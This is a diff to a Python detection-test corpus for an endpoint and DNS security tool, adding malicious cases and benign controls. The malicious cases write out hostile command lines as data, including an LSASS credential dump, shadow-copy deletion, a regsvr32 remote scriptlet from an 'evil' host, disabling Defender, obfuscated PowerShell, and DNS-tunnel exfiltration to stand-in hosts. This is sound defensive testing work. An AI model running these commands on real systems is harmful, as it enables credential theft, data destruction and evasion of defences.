@@ -23,7 +23,8 @@ from dataclasses import dataclass, field
 class Case:
     id: str
     detector: str          # cmdline | powershell | persistence | entropy | intel_domain |
-                           # intel_ip | scanner | sysmon | wmi | process | network | dga
+                           # intel_ip | scanner | sysmon | wmi | process | network | dga |
+                           # tunnel | behavior | anomaly | killchain
     malicious: bool        # True = should fire; False = benign control (must not fire)
     technique: str = ""    # MITRE ATT&CK id (malicious cases)
     tactic: str = ""
@@ -92,6 +93,124 @@ MALICIOUS: list[Case] = [
     # Tracker/ad infrastructure (site_scanner) — privacy detection
     Case("tracker-doubleclick", "scanner", True, "T1071", "command-and-control",
          "doubleclick.net", "known ad-tech tracker"),
+
+    # CNAME-cloaked trackers (cname_uncloak) — first-party-disguised trackers a
+    # DNS blocklist can't see because they only appear as a CNAME target. inp =
+    # the CNAME target host the uncloaker inspects.
+    Case("cname-eulerian", "cname", True, "T1071", "command-and-control",
+         "brand.eulerian.net", "Eulerian tracker cloaked behind a first-party CNAME"),
+    Case("cname-adobe-demdex", "cname", True, "T1071", "command-and-control",
+         "sync.brand.demdex.net", "Adobe Audience Manager CNAME cloak"),
+    Case("cname-atinternet", "cname", True, "T1071", "command-and-control",
+         "collect.ati-host.net", "AT Internet / Piano Analytics CNAME cloak"),
+
+    # ── DNS tunnelling / exfil (site_scanner S8/S9 + dns_tunnel.py) ──────────
+    # inp = a STREAM of hostnames (tunnelling is an aggregate shape). These
+    # pin the exact miss that let an Atomic Red Team DNS burst through as
+    # "allowed" before the flood/wildcard-provider signals existed.
+    Case("tunnel-art-nipio", "tunnel", True, "T1048.003", "exfiltration",
+         tuple(f"atomicredteam-{n}.127.0.0.1.nip.io"
+               for n in (703907, 435169, 339451, 583611, 478539, 636933)),
+         "Atomic Red Team DNS burst over nip.io wildcard provider"),
+    Case("tunnel-exfil-hex", "tunnel", True, "T1048.003", "exfiltration",
+         tuple(f"{chunk}.tunnel.evil-exfil.example"
+               for chunk in ("4d5a90000300", "0000000400000f", "ffff0000b800",
+                             "0000000040001a", "0000000000e01f", "ba0e00b409cd")),
+         "hex-encoded payload chunks streamed as subdomains"),
+    Case("tunnel-b64-stream", "tunnel", True, "T1048.003", "exfiltration",
+         tuple(f"{chunk}.dnscat.evil-c2.example"
+               for chunk in ("aGVsbG8wd29ybGQx", "c2VjcmV0ZGF0YTk5", "ZXhmaWx0cmF0aW9u",
+                             "bW9yZWRhdGFoZXJl", "ZmluYWxjaHVua3oz", "dGhlbGFzdG9uZTQ0")),
+         "base64 DNS tunnel (dnscat-style)"),
+
+    # ── Behavioral IOA rules (behavioral_rules.py) ─ representative sample;
+    #    the exhaustive per-rule + benign-control coverage is in
+    #    tests/test_behavioral_rules.py. inp = (image, parent, cmdline, path).
+    Case("beh-comsvcs-lsass", "behavior", True, "T1003.001", "credential-access",
+         ("rundll32.exe", "cmd.exe",
+          "rundll32 comsvcs.dll MiniDump 640 c:\\lsass.dmp full", ""),
+         "LSASS dump via comsvcs MiniDump"),
+    Case("beh-vssadmin", "behavior", True, "T1490", "impact",
+         ("vssadmin.exe", "cmd.exe", "vssadmin delete shadows /all /quiet", ""),
+         "shadow-copy deletion (ransomware precursor)"),
+    Case("beh-squiblydoo", "behavior", True, "T1218.010", "defense-evasion",
+         ("regsvr32.exe", "cmd.exe",
+          "regsvr32 /s /u /i:https://evil/x.sct scrobj.dll", ""),
+         "regsvr32 remote scriptlet (Squiblydoo)"),
+    Case("beh-defender-off", "behavior", True, "T1562.001", "defense-evasion",
+         ("powershell.exe", "cmd.exe",
+          "Set-MpPreference -DisableRealtimeMonitoring $true", ""),
+         "Defender real-time protection disabled"),
+    Case("beh-office-shell", "behavior", True, "T1059", "execution",
+         ("powershell.exe", "winword.exe", "powershell -nop -w hidden", ""),
+         "Office spawned a hidden PowerShell"),
+
+    # ── Behavioral anomaly scorer (behavior_score.py) ─ the GENERALIZING nose.
+    #    inp = (image, parent, cmdline, path). Every case here is a shape the
+    #    behavioral_rules.py rule list does NOT match — they prove the nose
+    #    catches intrinsic malicious scent no rule was written for. Paths are
+    #    kept outside the rules' generic suspicious-path fragments on purpose.
+    Case("anom-svchost-masquerade", "anomaly", True, "T1036.005", "defense-evasion",
+         ("svchost.exe", "explorer.exe", "svchost.exe", r"C:\ProgramData\svchost.exe"),
+         "system-process name running from a non-system path (masquerade)"),
+    Case("anom-double-extension", "anomaly", True, "T1036.007", "defense-evasion",
+         ("invoice.pdf.exe", "outlook.exe", "invoice.pdf.exe",
+          r"C:\Users\v\Documents\invoice.pdf.exe"),
+         "executable disguised as a PDF via double extension"),
+    Case("anom-webshell", "anomaly", True, "T1505.003", "persistence",
+         ("cmd.exe", "w3wp.exe", "cmd /c whoami", ""),
+         "internet-facing service (IIS w3wp) spawned a shell — web-shell"),
+    Case("anom-browser-spawns-ps", "anomaly", True, "T1059", "execution",
+         ("powershell.exe", "chrome.exe", "powershell -nop -w hidden", ""),
+         "browser spawned a hidden PowerShell (exploit foothold)"),
+    Case("anom-obfuscated-charcode", "anomaly", True, "T1027", "defense-evasion",
+         ("powershell.exe", "explorer.exe",
+          "powershell -nop -w hidden \"$x=[char]105+[char]101+[char]120;"
+          "[System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("
+          "'aWV4KG5ldy1vYmplY3QgbmV0LndlYmNsaWVudCk9'))\"", ""),
+         "char-code reassembly + encoded blob (novel obfuscation, no rule)"),
+    Case("anom-typosquat", "anomaly", True, "T1036.005", "defense-evasion",
+         ("svch0st.exe", "explorer.exe", "svch0st.exe",
+          r"C:\Users\v\AppData\Local\Temp\svch0st.exe"),
+         "typosquat of a system process name from a low-trust dir"),
+
+    # ── Multi-stage kill-chain correlation (edr/killchain.py) ───────────────
+    # inp = (actor, [(technique, title), ...]) — a sequence on ONE process.
+    # These pin the correlation win: the base same-category correlator would
+    # leave these as scattered single-tactic incidents; the chain correlator
+    # escalates them to one multi-stage attack. Tactic = the chain's endpoint.
+    Case("chain-full-intrusion", "killchain", True, "T1071.004", "command-and-control",
+         ("powershell.exe", [
+             ("T1059.001", "encoded PowerShell"),      # execution
+             ("T1105", "download cradle"),             # C2 (ingress tool transfer)
+             ("T1071.004", "DNS beacon"),              # C2
+             ("T1547.001", "registry Run key"),        # persistence
+             ("T1003.001", "LSASS access")]),          # credential-access
+         "execution → C2 → persistence → cred-access on one process"),
+    Case("chain-ransomware-run", "killchain", True, "T1486", "impact",
+         ("wscript.exe", [
+             ("T1059", "script exec"),                 # execution
+             ("T1562.001", "disable defenses"),        # defense-evasion
+             ("T1486", "mass file encryption")]),      # impact
+         "execution → defense-evasion → impact (ransomware chain)"),
+
+    # ── Named behavioural sequences / ESP IOAs (behavioral_sequences.py) ────
+    # inp = (actor, [(technique, [labels]), ...]) — an ORDERED behaviour stream
+    # on ONE actor that completes a specific named attack pattern. This is the
+    # CrowdStrike-style Event Stream Processing IOA the generic kill-chain
+    # (which only counts distinct tactics) cannot name.
+    Case("seq-inject-creds", "sequence", True, "T1003.001", "credential-access",
+         ("powershell.exe", [("T1055 — Process Injection", ["remote_thread"]),
+                             ("T1003.001 — LSASS Memory", ["lsass_access"])]),
+         "process injection → credential access (reflective-injection cred theft)"),
+    Case("seq-ransomware", "sequence", True, "T1486", "impact",
+         ("wscript.exe", [("T1490 — Inhibit System Recovery", ["shadow_delete"]),
+                          ("T1486 — Data Encrypted for Impact", ["mass_encryption"])]),
+         "shadow-copy deletion → mass encryption (ransomware detonation)"),
+    Case("seq-macro-c2", "sequence", True, "T1105", "command-and-control",
+         ("powershell.exe", [("T1059 — Command & Scripting Interpreter", ["office_child_shell"]),
+                             ("T1105 — Ingress Tool Transfer", ["download_cradle"])]),
+         "document-spawned shell → remote payload fetch (macro dropper)"),
 
     # ── ETW Sysmon sensor classification (etw/sysmon.classify_sysmon) ───────
     # Each case is (Sysmon EventID, EventData dict) — the same shape the real
@@ -212,6 +331,87 @@ BENIGN: list[Case] = [
          note="bank site, must never be blocked"),
     Case("b-scanner-unknown", "scanner", False, inp="some-small-blog-42.dev",
          note="unknown site — default allow"),
+
+    # CNAME uncloak FALSE-POSITIVE controls — legitimate CDN CNAME targets that
+    # must NEVER be mistaken for cloaked trackers (blocking these breaks the web).
+    Case("b-cname-akamai", "cname", False, inp="brand.com.edgekey.net",
+         note="Akamai CDN CNAME target — legitimate"),
+    Case("b-cname-cloudfront", "cname", False, inp="d111abcxyz.cloudfront.net",
+         note="CloudFront CDN CNAME target — legitimate"),
+    Case("b-cname-fastly", "cname", False, inp="brand.map.fastly.net",
+         note="Fastly CDN CNAME target — legitimate"),
+
+    # DNS-tunnel FALSE-POSITIVE controls — legitimate high-fan-out subdomain
+    # traffic that must NOT be flagged as a tunnel. The cost of a miss here is
+    # broken video / storage / dev tooling for the user.
+    Case("b-tunnel-googlevideo", "tunnel", False,
+         inp=tuple(f"rr{i}---sn-4g5e6nsz{i}.googlevideo.com" for i in range(8)),
+         note="YouTube video shard fan-out (exempt CDN root)"),
+    Case("b-tunnel-cdn-shards", "tunnel", False,
+         inp=tuple(f"d{i}abc{i}xyz.cloudfront.net" for i in range(8)),
+         note="CloudFront distribution hostnames (exempt CDN root)"),
+    Case("b-tunnel-normal-web", "tunnel", False,
+         inp=("www.github.com", "api.github.com", "avatars.githubusercontent.com",
+              "codeload.github.com", "docs.github.com"),
+         note="ordinary multi-service site — common labels, no flood"),
+    Case("b-tunnel-nipio-dev", "tunnel", False,
+         inp=("myapp.127.0.0.1.nip.io", "myapp.127.0.0.1.nip.io"),
+         note="legit local dev over nip.io — flagged at most, never blocked"),
+
+    # Behavioral-rule FALSE-POSITIVE controls — ordinary admin/user commands.
+    Case("b-beh-reg-query", "behavior", False,
+         inp=("reg.exe", "cmd.exe", "reg query hklm\\software", ""),
+         note="reg query (read) — not add/save"),
+    Case("b-beh-sc-query", "behavior", False,
+         inp=("sc.exe", "cmd.exe", "sc query windefend", ""),
+         note="service query — not create"),
+    Case("b-beh-certutil-hash", "behavior", False,
+         inp=("certutil.exe", "cmd.exe", "certutil -hashfile a.exe sha256", ""),
+         note="file hashing — not download/decode"),
+    Case("b-beh-net-view", "behavior", False,
+         inp=("net.exe", "cmd.exe", "net view", ""),
+         note="network view — not user /add"),
+
+    # Behavioral-anomaly FALSE-POSITIVE controls — the benign look-alikes a
+    # naive "temp=bad / lolbin=bad / weird-name=bad" scorer wrongly flags. These
+    # are the whole point of the nose's precision discipline.
+    Case("b-anom-real-svchost", "anomaly", False,
+         inp=("svchost.exe", "services.exe", "svchost.exe -k netsvcs",
+              r"C:\Windows\System32\svchost.exe"),
+         note="genuine svchost from System32 — the masquerade signal must not fire"),
+    Case("b-anom-installer", "anomaly", False,
+         inp=("AppSetup.exe", "explorer.exe", "AppSetup.exe /S",
+              r"C:\Users\v\Downloads\AppSetup.exe"),
+         note="ordinary installer double-clicked from Downloads (one weak signal)"),
+    Case("b-anom-updater-appdata", "anomaly", False,
+         inp=("Update.exe", "services.exe", "Update.exe --check",
+              r"C:\Users\v\AppData\Local\Slack\Update.exe"),
+         note="legit app updater under AppData\\Local\\<app> — not a temp root"),
+    Case("b-anom-msbuild-devenv", "anomaly", False,
+         inp=("msbuild.exe", "devenv.exe", "msbuild app.sln /p:Configuration=Release",
+              r"C:\Program Files\Microsoft Visual Studio\MSBuild\Current\Bin\msbuild.exe"),
+         note="LOLBin (msbuild) run legitimately by Visual Studio"),
+
+    # Kill-chain FALSE-POSITIVE controls — must NOT raise a multi-stage chain.
+    Case("b-chain-single-tactic", "killchain", False,
+         inp=("chrome.exe", [
+             ("T1071", "https"), ("T1071.004", "dns"), ("T1105", "update download")]),
+         note="one actor, all Command-and-Control — a single tactic is not a chain"),
+    Case("b-chain-admin-ps", "killchain", False,
+         inp=("powershell.exe", [
+             ("T1059.001", "admin script"), ("T1059", "another cmd")]),
+         note="ordinary admin PowerShell — repeated Execution only, no second tactic"),
+
+    # Behavioural-sequence FALSE-POSITIVE controls — the pieces present but NOT
+    # as a completed named pattern (wrong order / incomplete). Must NOT fire.
+    Case("b-seq-reversed", "sequence", False,
+         inp=("a.exe", [("T1003.001 — LSASS Memory", ["lsass_access"]),
+                        ("T1055 — Process Injection", ["remote_thread"])]),
+         note="credential-access BEFORE injection — wrong order, not the pattern"),
+    Case("b-seq-incomplete", "sequence", False,
+         inp=("a.exe", [("T1055 — Process Injection", ["remote_thread"]),
+                        ("T1082 — System Information Discovery", ["system_info"])]),
+         note="injection then benign discovery — sequence never completes"),
 
     # Sysmon benign controls — ordinary endpoint activity must not fire.
     Case("b-sysmon-signed-proc", "sysmon", False, inp=(
